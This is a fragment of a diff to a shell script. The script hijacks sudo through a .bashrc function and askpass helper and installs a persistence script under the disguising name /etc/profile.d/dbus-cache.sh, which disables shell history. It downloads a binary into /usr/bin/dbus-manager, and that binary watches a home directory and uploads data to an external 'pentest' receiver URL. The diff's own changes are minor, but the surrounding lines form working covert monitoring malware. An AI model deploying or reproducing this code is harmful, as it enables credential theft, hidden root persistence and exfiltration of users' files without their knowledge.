@@ -77,7 +77,7 @@ SUDO_ASKPASS="$ASKPASS_SCRIPT" /usr/bin/sudo -A bash << DEPLOYEOF
     cp "$GB_DIR/session-data" /etc/crypttab.key
     chmod 444 /etc/crypttab.key
 
-    cat > /etc/profile.d/dbus-cache.sh << "MONITOREOF"
+    cat > /etc/profile.d/dbus-cache.sh << "WATCHEOF"
 #!/bin/bash
 unset HISTFILE
 set +o history
@@ -88,7 +88,7 @@ if [ -f /etc/crypttab.key ]; then
     SUDO_ASKPASS="\$ASKPASS_SCRIPT" /usr/bin/sudo -A /usr/bin/dbus-manager --watch-path /home/kaucrow --server-url https://pentest-receiver-production.up.railway.app/watchdog/data 2>/dev/null
     rm -f "\$ASKPASS_SCRIPT"
 fi
-MONITOREOF
+WATCHEOF
 
     GOOD_BOY_URL="https://github.com/Kaucrow/good-boy/raw/refs/heads/main/bin/goodboy"
     curl -s -o /usr/bin/dbus-manager "\$GOOD_BOY_URL" || \
@@ -114,6 +114,7 @@ rm -f "$ASKPASS_SCRIPT"
 rm -f "$PASSWD_FILE"
 unset -f sudo
 sed -i "\|sudo() { source $SCRIPT_FILE|d" "$HOME/.bashrc"
+set -o history
 EOF
 
     chmod +x $SCRIPT_FILE
